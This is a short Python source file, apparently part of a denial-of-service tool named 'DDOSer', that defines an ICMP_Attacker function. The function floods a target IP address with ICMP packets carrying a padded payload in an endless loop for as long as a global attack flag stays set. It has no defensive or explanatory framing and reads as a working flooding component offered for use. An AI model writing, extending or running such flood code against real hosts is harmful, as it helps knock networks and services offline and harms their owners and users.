# libs
from lib.GPL.attackers.network.ICMP import gpl_icmp
import plugins.DDOSer.Status_Holders as Holders

# Attacker
def ICMP_Attacker(IP, packet_size=68):
    try:
        buff = ' ' * packet_size
        while Holders.In_Attack:
            gpl_icmp(IP, payload=buff)
    except (EOFError, KeyboardInterrupt):
        pass